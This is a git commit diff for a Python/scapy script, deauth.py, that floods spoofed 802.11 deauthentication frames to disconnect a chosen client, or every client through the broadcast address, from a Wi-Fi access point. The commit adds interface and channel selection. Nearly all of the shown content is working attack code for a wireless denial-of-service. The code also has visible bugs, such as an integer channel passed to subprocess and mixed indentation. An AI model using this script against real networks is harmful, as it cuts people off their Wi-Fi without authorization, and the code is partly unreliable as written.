b0215ea4c2b218c275c06b3e0448eeeaa96a99f7
Bojak4616 <jpb4616@rit.edu>
2017-04-17 19:07:40 -0400

    Added ability to change channel. Also fixed interface

--- utils/deauth.py
+++ utils/deauth.py
@@ -1,10 +1,12 @@
 #!/usr/bin/python
 import argparse
+import subprocess
 from sys import exit
 from scapy.all import *
 
 # Credit: https://gist.githubusercontent.com/jordan-wright/4576966/raw/5f17c9bfb747d6b2b702df3630028a097be8f399/perform_deauth.py
-def deauth(bssid, client, count):
+def deauth(iface, bssid, client, count, channel):
+    subprocess.call(['iwconfig', iface, 'channel', channel])
     pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
     cli_to_ap_pckt = None
     if client != 'FF:FF:FF:FF:FF:FF':
@@ -16,7 +18,7 @@ def deauth(bssid, client, count):
         try:
             for i in range(64):
                 # Send out deauth from the AP
-                send(pckt,verbose=0)
+                sendp(pckt, iface=iface, verbose=0)
 		print 'Sent one 64 packet deauth burst to' + client
                 # If we're targeting a client, we will also spoof deauth from the client to the AP
                 if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
@@ -28,13 +30,14 @@ def deauth(bssid, client, count):
 
 def main():
    parser = argparse.ArgumentParser(description='deauth.py - Deauthticate clients from a network')
-   parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='Interface to use for deauth')
+   parser.add_argument('-i', '--interface', dest='iface', type=str, required=True, help='Interface to use for deauth')
    parser.add_argument('-b', '--bssid', dest='bssid', type=str, required=True, help='BSSID of the access point')
    parser.add_argument('-c', '--client', dest='client', type=str, required=True, help='MAC of the client being DeAuthenticated')
    parser.add_argument('-n', '--packets', dest='count', type=int, required=False, help='Number of DeAuthentication packets to send')
+   parser.add_argument('-ch', '--channel', dest='channel', type=int, required=True, help='Channel which AP and client are on')
    args = parser.parse_args()
 
-   deauth(args.bssid, args.client, args.count)
+   deauth(args.iface, args.bssid, args.client, args.count, args.channel)
 
    exit(0)
 
